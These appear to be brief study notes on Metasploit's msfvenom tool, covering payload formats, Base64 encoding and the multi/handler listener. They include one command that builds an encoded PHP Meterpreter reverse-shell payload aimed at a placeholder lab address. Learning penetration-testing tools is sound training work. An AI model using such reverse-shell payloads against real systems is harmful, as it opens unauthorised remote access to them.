## msfconsole: To generate the payloads
- MsfVenom - a Metasploit standalone payload generator.
- Msfvenom, which replaced Msfpayload and Msfencode, allows you to generate payloads.
- Msfvenom will allow you to access all payloads available in the Metasploit framework. 
- Msfvenom allows you to create payloads in many different formats (PHP, exe, dll, elf, etc.) and for many different target systems (Apple, Windows, Android, Linux, etc.).
- **msfvenom --list** formats command can be used to list supported output formats.

## Encoder: (can be done by msfvenom)
- eg: msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.x.x -f raw -e php/base64
- with the -e parameter. The PHP version of Meterpreter was encoded in Base64

## Handlers: (Listener)
- Similar to exploits using a reverse shell, you will need to be able to accept incoming connections generated by the MSFvenom payload.
- use **exploit/multi/handler**
- 

## msfvenom task:
